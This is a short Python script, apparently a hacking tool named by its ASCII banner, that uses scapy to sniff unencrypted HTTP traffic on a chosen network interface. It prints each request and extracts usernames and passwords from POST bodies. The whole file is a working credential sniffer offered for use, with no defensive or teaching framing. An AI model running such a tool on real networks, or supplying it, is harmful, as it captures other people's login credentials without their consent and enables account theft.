from scapy.all import *
from scapy.layers.http import HTTPRequest, HTTPResponse
from urllib.parse import parse_qs

color_start = "\033[1;31m"
color_end = "\033[0m"
poster='''                                                                                          
                                  .                                                       
   :--:::::::                     .                                                       
   :-          ::::::   .:::::.   :.  .:::::.   ::::::.    .:::::    ::::::.   .:::::.    
   :-.::::::  :-::::.  :-.   .-- .-: .-.    :- .-:   .:-   .....:-  -:    .-. :-.   .-:   
   :-          .....-: :-     :- .-: :-     :- .-:    .-. -:.....-  -:    .-: :- :::::    
   .-:::::::. .:::::-: :- ::::-: .-: .-:::::-: .-:    .-. ::::::::  :-::::.-: .-::::      
                       :-                                                 .-:             
                       ..                                             .:::::                                  
                                                                                          
'''

print(color_start+poster+color_end)

interface=input("Enter the interface name : ")
def extract_credentials(http_payload):
    credentials = []
    
   
    try:
        parsed_data = parse_qs(http_payload)
        if 'username' in parsed_data:
            credentials.append(f"Username: {color_start}{parsed_data['username'][0]}{color_end}")
        if 'password' in parsed_data:
            credentials.append(f"Password: {color_start}{parsed_data['password'][0]}{color_end}")
    except Exception as e:
        print(f"Error parsing payload: {e}")
    
    return ", ".join(credentials)

def packet_handler(packet):
    ip_layer = packet.getlayer(IP)
    if not ip_layer:
        return 

    if packet.haslayer(HTTPRequest):
        http_layer = packet.getlayer(HTTPRequest)
        method = http_layer.Method.decode()
        host = http_layer.Host.decode()
        path = http_layer.Path.decode()
        payload = bytes(http_layer.payload).decode(errors='ignore')
        
        print(f"HTTP Request: {method} {host}{path} (IP src: {ip_layer.src})")
        if method == "POST":
            credentials = extract_credentials(payload)
            if credentials:
                print(f"Possible credentials: {credentials}")

    elif packet.haslayer(HTTPResponse):
        http_layer = packet.getlayer(HTTPResponse)
        payload = bytes(http_layer.payload).decode(errors='ignore')
        
        print(f"HTTP Response: (IP dst: {ip_layer.dst})")
        
try:
    print("Sniffing started. Press Ctrl+C to stop.")
    sniff(iface= interface, prn=packet_handler, filter="tcp port 80", count=0)  
except KeyboardInterrupt:
    print("\nSniffing stopped by user.")
